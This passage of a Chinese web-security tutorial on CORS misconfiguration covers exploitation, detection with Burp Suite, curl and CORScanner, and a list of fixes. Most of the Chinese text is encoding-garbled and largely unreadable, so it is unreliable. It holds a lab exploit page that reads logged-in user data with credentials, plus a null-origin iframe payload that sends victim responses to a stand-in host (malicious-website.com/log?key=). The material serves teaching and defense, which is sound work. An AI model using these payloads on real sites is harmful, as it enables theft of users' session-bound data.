æ¥ä¸‹æ¥é»‘å®¢å°†è·å–åˆ°çš„æ•æ„Ÿä¿¡æ¯POSTæäº¤åˆ°save.phpä¸­ï¼Œè€Œsave.phpå°†æ•°æ®ä¿å­˜åœ¨phpinfo.htmlé‡Œã€‚evil.com/save.phpä»£ç å¦‚ä¸‹ï¼š é»‘å®¢çš„è¯·æ±‚æµç¨‹æ˜¯steal.html-&gt;phpinfo.php-&gt;save.phpã€‚æˆ‘ä»¬é€šè¿‡BurpSuiteçš„RepeateråŠŸèƒ½é‡æ”¾æŠ“åˆ°çš„phpinfo.phpè¯·æ±‚åŒ…å¯ä»¥å‘ç°å“åº”åŒ…æ˜¯å«æœ‰è¿”å›å†…å®¹çš„ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚åˆ°çš„èµ„æºã€‚ ä½†æ˜¯åœ¨save.phpä¸­å¹¶æ²¡æœ‰è¿”å›çš„èµ„æºï¼Œé€šè¿‡æ£€æŸ¥æµè§ˆå™¨çš„æ§åˆ¶å°æç¤ºä¿¡æ¯å‘ç°ï¼Œç”±äºå“åº”åŒ…ç¼ºå°‘Access-Control-Allow-Originå“åº”å¤´ï¼Œå¯¼è‡´æµè§ˆå™¨æ‹¦æˆªäº†è·¨æºè¯·æ±‚ã€‚ å»æ‰foo.com/phpinfo.phpæœåŠ¡ç«¯çš„æ³¨é‡Š é‡æ–°è®¿é—®http://evil.com/steal.html å‘ç°å“åº”åŒ…ä¸­å‡ºç°äº†å¯¹åº”çš„CORSå“åº”å¤´ï¼ŒAccess-Control-Allow-OriginæŒ‡æ˜¯å…è®¸è®¿é—®çš„æºï¼ŒAccess-Control-Allow-CredentialsæŒ‡çš„æ˜¯å…è®¸å¸¦ä¸Šcookieè®¿é—®èµ„æºã€‚è¿™æ ·æµè§ˆå™¨å°±ä¸ä¼šå‡ºé”™è€Œæ‹¦æˆªè¯·æ±‚äº†ï¼Œéšåjsè„šæœ¬æŠŠé¡µé¢ç¼–ç åå‘é€åˆ°evil.com/save.phpå» æ¨¡æ‹Ÿé»‘å®¢è®¿é—®evil.com/phpinfo.htmlé¡µé¢ï¼Œå¯ä»¥å‘ç°å·²ç»è¢«çªƒå–è¿‡æ¥çš„æ•æ„Ÿä¿¡æ¯ã€‚è‡³æ­¤æˆåŠŸåˆ©ç”¨CORSæ¼æ´è¿›è¡Œè·¨åŸŸèµ„æºè®¿é—®ã€‚ 0x04 ä¿®å¤åŠé˜²å¾¡æ–¹å¼ 1.ä»”ç»†è¯„ä¼°æ˜¯å¦å¼€å¯CORSï¼Œå¦‚æœä¸å¿…è¦å°±ä¸è¦å¼€å¯CORS 2.å¦‚æœæ˜¯ç»å¯¹å¿…è¦çš„è¯ï¼Œè¦å®šä¹‰â€œæºâ€çš„ç™½åå•ã€‚å°½é‡ä¸ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼é…ç½®ï¼Œä¸è¦é…ç½®â€œAccess-Contol-Allow-Originâ€ä¸ºé€šé…ç¬¦â€œ*â€ï¼ŒåŒæ—¶ä¸¥æ ¼æ ¡éªŒæ¥è‡ªè¯·æ±‚çš„Originå€¼ã€‚ 3.ä»…ä»…å…è®¸å®‰å…¨çš„åè®®ï¼Œæœ‰å¿…è¦éªŒè¯åè®®ä»¥ç¡®ä¿ä¸å…è®¸æ¥è‡ªä¸å®‰å…¨é€šé“ï¼ˆHTTPï¼‰çš„äº¤äº’ï¼Œå¦åˆ™ä¸­é—´äºº(MitM)å°†ç»•è¿‡åº”ç”¨æ˜¯æ‰€ä½¿ç”¨çš„HTTPS 4.è¦å°½å¯èƒ½çš„è¿”å›\"Vary: Origin\"è¿™ä¸ªå¤´éƒ¨ï¼Œä»¥é¿å…æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜ 5.å¦‚æœå¯èƒ½çš„è¯é¿å…ä½¿ç”¨â€œCredentialsâ€å¤´ï¼Œç”±äºâ€œAccess-Control-Allow-Credentialsâ€æ ‡å¤´è®¾ç½®ä¸ºâ€œtrueâ€æ—¶å…è®¸è·¨åŸŸè¯·æ±‚ä¸­å¸¦æœ‰å‡­è¯æ•°æ®ï¼Œå› æ­¤åªæœ‰åœ¨ä¸¥æ ¼å¿…è¦æ—¶æ‰åº”é…ç½®å®ƒã€‚æ­¤å¤´éƒ¨ä¹Ÿå¢åŠ äº†CSRFæ”»å‡»çš„é£é™©;å› æ­¤ï¼Œæœ‰å¿…è¦å¯¹å…¶è¿›è¡Œä¿æŠ¤ã€‚ 6.é™åˆ¶ä½¿ç”¨çš„æ–¹æ³•ï¼Œé€šè¿‡â€œAccess-Control-Allow-Methodsâ€å¤´éƒ¨ï¼Œè¿˜å¯ä»¥é…ç½®å…è®¸è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ï¼Œè¿™æ ·å¯ä»¥æœ€å¤§é™åº¦åœ°å‡å°‘æ‰€æ¶‰åŠçš„æ–¹æ³•ã€‚ 7.é™åˆ¶ç¼“å­˜çš„æ—¶é—´ï¼Œé€šè¿‡â€œAccess-Control-Allow-Methodsâ€å’Œâ€œAccess-Control-Allow-Headersâ€å¤´éƒ¨ï¼Œé™åˆ¶æµè§ˆå™¨ç¼“å­˜ä¿¡æ¯çš„æ—¶é—´ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨â€œAccess-Control-Max-Ageâ€æ ‡é¢˜æ¥å®Œæˆï¼Œè¯¥å¤´éƒ¨æ¥æ”¶æ—¶é—´æ•°ä½œä¸ºè¾“å…¥ï¼Œè¯¥æ•°å­—æ˜¯æµè§ˆå™¨ä¿å­˜ç¼“å­˜çš„æ—¶é—´ã€‚é…ç½®ç›¸å¯¹è¾ƒä½çš„å€¼ï¼ˆä¾‹å¦‚å¤§çº¦30åˆ†é’Ÿï¼‰ï¼Œç¡®ä¿æµè§ˆå™¨åœ¨çŸ­æ—¶é—´å†…å¯ä»¥æ›´æ–°ç­–ç•¥ï¼ˆæ¯”å¦‚å…è®¸çš„æºï¼‰ã€‚ 8.ä»…é…ç½®æ‰€éœ€è¦çš„å¤´ï¼Œä»…åœ¨æ¥æ”¶åˆ°è·¨åŸŸè¯·æ±‚çš„æ—¶å€™æ‰é…ç½®æœ‰å…³äºè·¨åŸŸçš„å¤´éƒ¨ï¼Œå¹¶ä¸”ç¡®ä¿è·¨åŸŸè¯·æ±‚æ˜¯åˆæ³•çš„ï¼ˆåªå…è®¸æ¥è‡ªåˆæ³•çš„æºï¼‰ã€‚ 0x05 ç®€å•è¯·æ±‚çš„ç¤ºä¾‹ è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰è§„èŒƒè§„å®šäº†åœ¨WebæœåŠ¡å™¨å’Œæµè§ˆå™¨ä¹‹é—´äº¤æ¢çš„æ ‡å¤´å†…å®¹ï¼Œè¯¥æ ‡å¤´å†…å®¹é™åˆ¶äº†æºåŸŸä¹‹å¤–çš„åŸŸè¯·æ±‚webèµ„æºã€‚CORSè§„èŒƒæ ‡è¯†äº†åè®®å¤´ä¸­Access-Control-Allow-Originæœ€é‡è¦çš„ä¸€ç»„ã€‚å½“ç½‘ç«™è¯·æ±‚è·¨åŸŸèµ„æºæ—¶ï¼ŒæœåŠ¡å™¨å°†è¿”å›æ­¤æ ‡å¤´ï¼Œå¹¶ç”±æµè§ˆå™¨æ·»åŠ æ ‡å¤´Originã€‚ ä¾‹å¦‚ä¸‹é¢çš„æ¥è‡ªç«™ç‚¹ http://example.com çš„ç½‘é¡µåº”ç”¨æƒ³è¦è®¿é—® http://bar.com çš„èµ„æºï¼š requests 1 GET /resources/public-data/ HTTP/1.1 2 Host: bar.com 3 User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre 4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5 Accept-Language: en-us,en;q=0.5 6 Accept-Encoding: gzip,deflate 7 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 8 Connection: keep-alive 9 Referer: http://example.com/examples/access-control/simpleXSInvocation.html 10 Origin: http://example.com response 11 HTTP/1.1 200 OK 12 Date: Mon, 01 Dec 2020 00:23:53 GMT 13 Server: Apache/2.0.61 14 Access-Control-Allow-Origin: * 15 Keep-Alive: timeout=2, max=100 16 Connection: Keep-Alive 17 Transfer-Encoding: chunked 18 Content-Type: application/xml ç¬¬ 1~9 è¡Œæ˜¯è¯·æ±‚é¦–éƒ¨ã€‚åœ¨ç¬¬10è¡Œçš„è¯·æ±‚å¤´ Origin è¡¨æ˜è¯¥è¯·æ±‚æ¥æºäº http://example.comã€‚ ç¬¬ 11~18 è¡Œæ˜¯æ¥è‡ªäº http://bar.com çš„æœåŠ¡ç«¯å“åº”ã€‚å“åº”ä¸­æºå¸¦äº†å“åº”é¦–éƒ¨å­—æ®µ Access-Control-Allow-Originï¼ˆç¬¬ 14 è¡Œï¼‰ã€‚ä½¿ç”¨ Origin å’Œ Access-Control-Allow-Origin å°±èƒ½å®Œæˆæœ€ç®€å•çš„è®¿é—®æ§åˆ¶ã€‚æœ¬ä¾‹ä¸­ï¼ŒæœåŠ¡ç«¯è¿”å›çš„ Access-Control-Allow-Origin: * è¡¨æ˜ï¼Œè¯¥èµ„æºå¯ä»¥è¢«ä»»æ„å¤–åŸŸè®¿é—®ã€‚å¦‚æœæœåŠ¡ç«¯ä»…å…è®¸æ¥è‡ª http://example.com çš„è®¿é—®ï¼Œè¯¥é¦–éƒ¨å­—æ®µçš„å†…å®¹å¦‚ä¸‹ï¼š Access-Control-Allow-Origin: http://example.com å¦‚æœè·¨åŸŸè¯·æ±‚å¯ä»¥åŒ…å«cookieçš„è¯ï¼Œåœ¨æœåŠ¡å™¨å“åº”é‡Œåº”è¯¥æœ‰è¿™ä¸€å­—æ®µï¼š Access-Control-Allow-Credentials: true è¿™æ ·çš„è¯æ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥çªƒå–å·²ç»åœ¨è¿™ä¸ªç½‘ç«™ä¸Šç™»å½•äº†çš„ç”¨æˆ·çš„ä¿¡æ¯ï¼ˆåˆ©ç”¨cookieï¼‰ 0x06 æ¼æ´åˆ©ç”¨ è¿™é‡Œä»¥droaboxé¶åœºä¸ºä¾‹ è¿™ä¸ªæ¥å£ä¼šè¿”å›å·²ç™»å½•çš„ç”¨æˆ·çš„ä¿¡æ¯æ•°æ®ï¼Œé€šè¿‡è®¿é—®è¯¥ç½‘é¡µçš„å“åº”æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œå¯èƒ½å­˜åœ¨CORSè·¨åŸŸèµ„æºå…±äº«æ¼æ´ æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å»ºç«‹ä¸€ä¸ªæ¶æ„çš„jsä»£ç  &lt;!-- cors.html --&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;cors exp&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=\"text/javascript\"&gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; //ä½œç”¨è§£é‡Šå¦‚ä¸‹ } }; xhttp.open(\"GET\", \"http://192.168.0.101/DoraBox/csrf/userinfo.php\"); xhttp.withCredentials = true; xhttp.send(); } cors(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; //document.getElementById(\"demo\").innerHTML = this.responseText; è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯å°† this.responseText çš„å†…å®¹è®¾ç½®ä¸ºå…·æœ‰ id \"demo\" çš„å…ƒç´ çš„å†…éƒ¨ HTMLã€‚ å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š document.getElementById(\"demo\") æ˜¯ä¸€ä¸ª DOM æ–¹æ³•ï¼Œå®ƒé€šè¿‡å…ƒç´ çš„ id å±æ€§è·å–å¯¹åº”çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒè·å–å…·æœ‰ id \"demo\" çš„å…ƒç´ ã€‚ .innerHTML æ˜¯è·å–æˆ–è®¾ç½® HTML å…ƒç´ çš„å†…éƒ¨ HTML å†…å®¹çš„å±æ€§ã€‚é€šè¿‡å°†ç­‰å·å³ä¾§çš„å€¼èµ‹ç»™å®ƒï¼Œå¯ä»¥æ›´æ–°å…ƒç´ çš„å†…éƒ¨ HTML å†…å®¹ã€‚ this.responseText æ˜¯ XMLHttpRequest å¯¹è±¡çš„å±æ€§ï¼Œå®ƒåŒ…å«ä»æœåŠ¡å™¨è¿”å›çš„å“åº”æ–‡æœ¬ã€‚ å› æ­¤ï¼Œè¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯å°†æœåŠ¡å™¨è¿”å›çš„å“åº”æ–‡æœ¬ï¼ˆthis.responseTextï¼‰è®¾ç½®ä¸ºå…·æœ‰ id \"demo\" çš„å…ƒç´ çš„å†…éƒ¨ HTML å†…å®¹ã€‚è¿™æ ·ï¼Œåœ¨ç½‘é¡µä¸­å…·æœ‰ id \"demo\" çš„å…ƒç´ ä¼šæ˜¾ç¤ºæœåŠ¡å™¨è¿”å›çš„æ–‡æœ¬å†…å®¹ã€‚ è®¿é—®è¿™ä¸ªé¡µé¢å°±å¯ä»¥è·å–å·²ç™»å½•çš„ç”¨æˆ·çš„ä¿¡æ¯ è¯¥æ¶æ„ä»£ç é¦–å…ˆå®šä¹‰ä¸€ä¸ªå‡½æ•°corsï¼Œä»¥getå½¢å¼è®¿é—®ç›®æ ‡ç½‘å€ï¼Œåˆ›å»ºXMLHttpRequestå¯¹è±¡ä¸ºxhttpï¼Œé€šè¿‡ajaxçš„onreadystatechangeåˆ¤æ–­è¯·æ±‚çŠ¶æ€ï¼Œå¦‚æœè¯·æ±‚å·²å®Œæˆï¼Œä¸”ç›¸åº”å·²å°±ç»ªï¼Œåˆ™å¼¹å‡ºè¿”å›æ–‡æœ¬ã€‚ 0x07 æ¼æ´å‘ç°æŠ€å·§ åœ¨ä¹‹å‰æˆ‘ä»¬äº†è§£äº†ä¸€äº›å…³äºCORSè·¨åŸŸèµ„æºå…±äº«é€šä¿¡çš„ä¸€äº›å­—æ®µå«ä¹‰ï¼Œ CORSçš„æ¼æ´ä¸»è¦çœ‹å½“æˆ‘ä»¬å‘èµ·çš„è¯·æ±‚ä¸­å¸¦æœ‰Originå¤´éƒ¨å­—æ®µæ—¶ï¼ŒæœåŠ¡å™¨çš„è¿”å›åŒ…å¸¦æœ‰CORSçš„ç›¸å…³å­—æ®µå¹¶ä¸”å…è®¸Originçš„åŸŸè®¿é—®ã€‚ æ–¹å¼ä¸€: BurpSuite ä¸€èˆ¬æµ‹è¯•WEBæ¼æ´éƒ½ä¼šç”¨ä¸ŠBurpSuiteï¼Œè€ŒBurpSuiteå¯ä»¥å®ç°å¸®åŠ©æˆ‘ä»¬æ£€æµ‹è¿™ä¸ªæ¼æ´ã€‚ æ–¹å¼ä¸€: é¦–å…ˆæ˜¯è‡ªåŠ¨åœ¨HTTPè¯·æ±‚åŒ…ä¸­åŠ ä¸ŠOriginçš„å¤´éƒ¨å­—æ®µï¼Œæ‰“å¼€BurpSuiteï¼Œé€‰æ‹©Proxyæ¨¡å—ä¸­çš„Optionsé€‰é¡¹ï¼Œæ‰¾åˆ°Match and Replaceè¿™ä¸€æ ï¼Œå‹¾é€‰Request header å°†ç©ºæ›¿æ¢ä¸ºOrigin:example.comçš„Enableæ¡†ã€‚ åœ¨Filter by search term ä¸­è¾“å…¥ï¼šAccess-Control-Allow-Origin: foo.example.org HTTP historyåˆ—è¡¨ä¸­å‡ºç°ç¬¦åˆæ¡ä»¶çš„è¯·æ±‚åŒ…ï¼Œç‚¹å‡»Ctrl+Rï¼Œç‚¹å‡»GOï¼Œå¦‚ä¸‹å›¾ï¼Œå³è¯¥å¤„æœ‰CORSæ¼æ´ã€‚ ç»„åˆåº”æ˜¯è¿™ç§ï¼š Access-Control-Allow-Origin: foo.example.org Access-Control-Allow-Credentials: true æ³¨æ„ï¼å¦‚ä¸‹ç»„åˆæ˜¯æ²¡æœ‰æ¼æ´çš„ã€‚å› ä¸ºæµè§ˆå™¨å·²ç»ä¼šé˜»æ­¢å¦‚ä¸‹é…ç½®ã€‚ Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true å½“æˆ‘ä»¬è¿›è¡Œæµ‹è¯•æ—¶ï¼Œçœ‹æœåŠ¡å™¨å“åº”å¤´å­—æ®µé‡Œå¯ä»¥å…³æ³¨è¿™å‡ ä¸ªç‚¹ï¼š æœ€å¥½åˆ©ç”¨çš„é…ç½®ï¼š Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Credentials: true å¯èƒ½å­˜åœ¨å¯åˆ©ç”¨çš„é…ç½®ï¼š Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true å¾ˆå¥½çš„æ¡ä»¶ä½†æ— æ³•åˆ©ç”¨ï¼š ä¸‹é¢è¿™ç»„é…ç½®ç»„åˆè™½ç„¶çœ‹èµ·æ¥å¾ˆå®Œç¾ä½†æ˜¯CORSæœºåˆ¶å·²ç»é»˜è®¤è‡ªåŠ¨ç¦æ­¢äº†è¿™ç§ç»„åˆï¼Œç®—æ˜¯CORSçš„æœ€åä¸€é“é˜²çº¿ Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true å•ä¸€çš„æƒ…å†µ æ–¹å¼äºŒ: Access-Control-Allow-Originï¼š curlå‘½ä»¤ï¼Œè¾“å…¥curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I å¦‚æœå‡ºç°è¿™ç§ç»„åˆï¼Œè¯´æ˜å­˜åœ¨CORSæ¼æ´ Access-Control-Allow-Origin: foo.example.org Access-Control-Allow-Credentials: true æ–¹å¼ä¸‰: ä½¿ç”¨CORScannerå·¥å…·(æ¼æ´è‡ªåŠ¨åŒ–æ‰«æ) githubä¸Šæä¾›äº†ä¸€ä¸ªå…³äºæ‰«æCORSé…ç½®æ¼æ´çš„è„šæœ¬ https://github.com/chenjj/CORScanner CORScanneræ˜¯ä¸€ä¸ªpythonå·¥å…·ï¼Œæ—¨åœ¨å‘ç°ç½‘ç«™çš„CORSé”™è¯¯é…ç½®æ¼æ´ã€‚å®ƒå¯ä»¥å¸®åŠ©ç½‘ç«™ç®¡ç†å‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜æ£€æŸ¥ä»–ä»¬é’ˆå¯¹çš„åŸŸ/ URLæ˜¯å¦å…·æœ‰ä¸å®‰å…¨çš„CORSç­–ç•¥ã€‚ æ€»ç»“æ¼æ´çš„åŸå› ï¼š 1ï¼šCORSæœåŠ¡ç«¯çš„ Access-Control-Allow-Origin è®¾ç½®ä¸ºäº† *ï¼Œå¹¶ä¸” Access-Control-Allow-Credentials è®¾ç½®ä¸ºfalseï¼Œè¿™æ ·ä»»ä½•ç½‘ç«™éƒ½å¯ä»¥è·å–è¯¥æœåŠ¡ç«¯çš„ä»»ä½•æ•°æ®äº†ã€‚ 2ï¼šæœ‰ä¸€äº›ç½‘ç«™çš„Access-Control-Allow-Originä»–çš„è®¾ç½®å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯æ ¹æ®ç”¨æˆ·è·¨åŸŸè¯·æ±‚æ•°æ®çš„Originæ¥å®šçš„ã€‚è¿™æ—¶ï¼Œä¸ç®¡Access-Control-Allow-Credentials è®¾ç½®ä¸ºäº† true è¿˜æ˜¯ falseã€‚ä»»ä½•ç½‘ç«™éƒ½å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œå¹¶è¯»å–å¯¹è¿™äº›è¯·æ±‚çš„å“åº”ã€‚æ„æ€å°±æ˜¯ä»»ä½•ä¸€ä¸ªç½‘ç«™éƒ½å¯ä»¥å‘é€è·¨åŸŸè¯·æ±‚æ¥è·å¾—CORSæœåŠ¡ç«¯ä¸Šçš„æ•°æ®ã€‚ å®‰å…¨éšæ‚£ è¿™ä¸ªæµç¨‹ä¸­ã€‚æœåŠ¡å™¨æ¥æ”¶åˆ°è·¨åŸŸè¯·æ±‚çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å…ˆéªŒè¯ï¼Œè€Œæ˜¯å…ˆå¤„ç†äº†è¯·æ±‚ã€‚æ‰€ä»¥ä»æŸç§ç¨‹åº¦ä¸Šæ¥è¯´ã€‚åœ¨æ”¯æŒCORSçš„æµè§ˆå™¨ä¸Šå®ç°è·¨åŸŸçš„å†™èµ„æºï¼Œæ‰“ç ´äº†ä¼ ç»ŸåŒæºç­–ç•¥ä¸‹ä¸èƒ½è·¨åŸŸè¯»å†™èµ„æºã€‚ å¦‚æœå°†Access-Control-Allow-Originè®¾ç½®ä¸ºå…è®¸æ¥è‡ªæ‰€æœ‰åŸŸçš„è·¨åŸŸè¯·æ±‚ã€‚é‚£ä¹ˆCORSçš„å®‰å…¨æœºåˆ¶å‡ ä¹å°±æ— æ•ˆäº†ã€‚ä½†æ˜¯è¿™é‡Œåœ¨è®¾è®¡çš„æ—¶å€™æœ‰ä¸€ä¸ªå¾ˆå¥½çš„é™åˆ¶ã€‚xmlhttprequestå‘é€çš„è¯·æ±‚éœ€è¦ä½¿ç”¨â€œwithCredentialsâ€æ¥å¸¦ä¸Šcookieï¼Œå¦‚æœä¸€ä¸ªç›®æ ‡åŸŸè®¾ç½®æˆäº†å…è®¸ä»»æ„åŸŸçš„è·¨åŸŸè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚åˆå¸¦ç€cookieçš„è¯ï¼Œè¿™ä¸ªè¯·æ±‚æ˜¯ä¸åˆæ³•çš„ã€‚ï¼ˆå°±æ˜¯å¦‚æœéœ€è¦å®ç°å¸¦cookieçš„è·¨åŸŸè¯·æ±‚ï¼Œéœ€è¦æ˜ç¡®çš„é…ç½®å…è®¸æ¥æºçš„åŸŸï¼Œä½¿ç”¨ä»»æ„åŸŸçš„é…ç½®æ˜¯ä¸åˆæ³•çš„ï¼‰æµè§ˆå™¨ä¼šå±è”½æ‰è¿”å›çš„ç»“æœã€‚ 0x08 å…¶ä»–å¯èƒ½åˆ©ç”¨æ¼æ´çš„åœ°æ–¹ 8.1 è§£æOriginå¤´æ—¶å‡ºé”™ ä¸€äº›æ”¯æŒä»å¤šä¸ªæ¥æºè¿›è¡Œè®¿é—®çš„åº”ç”¨ç¨‹åºé€šè¿‡ä½¿ç”¨å…è®¸çš„æ¥æºç™½åå•æ¥å®ç°ã€‚æ”¶åˆ°CORSè¯·æ±‚åï¼Œä¼šå°†æä¾›çš„æ¥æºä¸ç™½åå•è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ¥æºå‡ºç°åœ¨ç™½åå•ä¸­ï¼Œé‚£ä¹ˆå®ƒä¼šåæ˜ åœ¨Access-Control-Allow-Originæ ‡é¢˜ä¸­ï¼Œä»¥ä¾¿æˆäºˆè®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œwebåº”ç”¨æ”¶åˆ°ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚ï¼š GET /data HTTP/1.1 Host: bar.com ... Origin: https://example.com webåº”ç”¨æ ¹æ®å…¶å…è®¸çš„æ¥æºåˆ—è¡¨æ£€æŸ¥å½“å‰è¯·æ±‚èµ„æºçš„æ¥æºï¼Œå¦‚æœåœ¨åˆ—è¡¨ä¸­ï¼Œåˆ™æŒ‰ä»¥ä¸‹æ–¹å¼åæ˜ è¯¥æ¥æºï¼š HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://example.com ä½†åœ¨æ£€æµ‹æ¥æºæ˜¯å¦å­˜åœ¨äºç™½åå•æ—¶ç»å¸¸å¯èƒ½å‡ºç°é—®é¢˜ï¼Œä¸€äº›ç½‘ç«™å¯èƒ½ä¼šå…è®¸å…¶æ‰€æœ‰çš„å­åŸŸï¼ˆåŒ…æ‹¬å°šæœªå­˜åœ¨æœªæ¥å¯èƒ½å­˜åœ¨çš„å­åŸŸï¼‰æ¥è¿›è¡Œè®¿é—®ï¼Œæˆ–è€…å…è®¸å…¶ä»–ç½‘ç«™çš„åŸŸä»¥åŠå…¶å­åŸŸæ¥è®¿é—®è¯·æ±‚ã€‚è¿™äº›è¯·æ±‚ä¸€èˆ¬éƒ½é€šè¿‡é€šé…ç¬¦æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼æ¥å®Œæˆï¼Œä½†æ˜¯å¦‚æœè¿™å…¶ä¸­å‡ºç°é”™è¯¯å¯èƒ½å°±ä¼šå¯¼è‡´ç»™äºˆå…¶ä»–æœªè¢«æˆæƒçš„åŸŸè®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼š ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆäºˆå¯¹ä»¥ä¸‹åˆ—ç»“å°¾çš„æ‰€æœ‰åŸŸçš„è®¿é—®æƒé™ï¼š example.com æ”»å‡»è€…å¯èƒ½å¯ä»¥é€šè¿‡æ³¨å†ŒåŸŸæ¥è·å¾—è®¿é—®æƒé™ï¼š exeexample.com æˆ–è€…ï¼Œå‡è®¾åº”ç”¨ç¨‹åºæˆäºˆå¯¹æ‰€æœ‰ä»¥example.comå¼€å¤´çš„åŸŸè®¿é—®æƒé™ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨è¯¥åŸŸè·å¾—è®¿é—®æƒé™ï¼š example.com.evil-user.net 8.2 åˆ©ç”¨ç›¸äº’å—CORSä¿¡ä»»çš„åŸŸæ¥è¿›è¡ŒXSS å‡å¦‚ä¸¤ä¸ªäº’ç›¸å—ä¿¡ä»»çš„æºï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªç½‘ç«™å­˜åœ¨XSSï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨XSSæ³¨å…¥ä¸€äº›JavaScriptä»£ç ï¼Œåˆ©ç”¨è¿™äº›ä»£ç å¯¹ä¿¡ä»»å…¶æºçš„å¦ä¸€ä¸ªç½‘ç«™è¿›è¡Œæ•æ„Ÿä¿¡æ¯çš„è·å–ã€‚ å¦‚æœè¿›è¡ŒCORSè¯·æ±‚æ—¶ç½‘ç«™å“åº”ï¼š HTTP/1.1 200 OK Access-Control-Allow-Origin: https://vulnerable.com Access-Control-Allow-Credentials: true å°±å¯ä»¥åˆ©ç”¨XSSæ¼æ´åœ¨vulnerable.comç½‘ç«™ä¸Šä½¿ç”¨ä¸‹é¢çš„URLæ¥é€šè¿‡æ£€ç´¢APIå¯†é’¥ï¼š https://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt; 8.3 ç™½åå•ä¸­çš„nullå€¼ CORSåè®®çš„ä¸€ä¸ªé‡è¦å®‰å…¨å‰ææ˜¯è·¨åŸŸè¯·æ±‚ä¸­çš„Originå¤´ä¸èƒ½è¢«ä¼ªé€ ï¼Œè¿™ä¸ªå‰æå¹¶ä¸æ˜¯æ€»æ˜¯æˆç«‹ã€‚Originå¤´æœ€æ—©è¢«æå‡ºç”¨äºé˜²å¾¡CSRFæ”»å‡»ï¼Œå®ƒçš„è¯­æ³•æ ¼å¼åœ¨RFC 6564ä¸­è¢«å®šä¹‰ã€‚RFC 6564è§„å®šï¼Œå¦‚æœè¯·æ±‚æ¥è‡ªéšç§æ•æ„Ÿä¸Šä¸‹æ–‡æ—¶ï¼ŒOriginå¤´çš„å€¼åº”è¯¥ä¸ºnullï¼Œä½†æ˜¯å®ƒå´æ²¡æœ‰æ˜ç¡®ç•Œå®šä»€ä¹ˆæ˜¯éšç§æ•æ„Ÿä¸Šä¸‹æ–‡ã€‚ CORSåè®®å¤ç”¨äº†Originå¤´ï¼Œä½†åœ¨CORSæ ‡å‡†ä¸­åŒæ ·ç¼ºä¹å¯¹è·¨åŸŸè¯·æ±‚Originä¸­nullæ˜ç¡®çš„å®šä¹‰å’Œé™åˆ¶ã€‚æœ‰äº›å¼€å‘è€…åœ¨ç½‘ç«™ä¸Šé…ç½®ä¿¡ä»» nullï¼Œç”¨äºä¸æœ¬åœ°fileé¡µé¢å…±äº«æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å„ç§æŠ€å·§æ¥ç”Ÿæˆè·¨åŸŸè¯·æ±‚ï¼Œè¯¥è¯·æ±‚æ„é€ çš„Originä¸ºnullå€¼ã€‚è¿™å°†æ»¡è¶³ç™½åå•çš„è¦æ±‚ï¼Œä»è€Œå¯¼è‡´è·¨åŸŸè®¿é—®ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨iframeä»¥ä¸‹æ ¼å¼çš„æ²™ç›’è·¨åŸŸè¯·æ±‚æ¥å®Œæˆï¼š &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener(); req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; &lt;/script&gt;\"&gt; &lt;/iframe&gt; è¿™å°±æ„å‘³ç€ä»»ä½•é…ç½®æœ‰Access-Control-Allow-Origin: 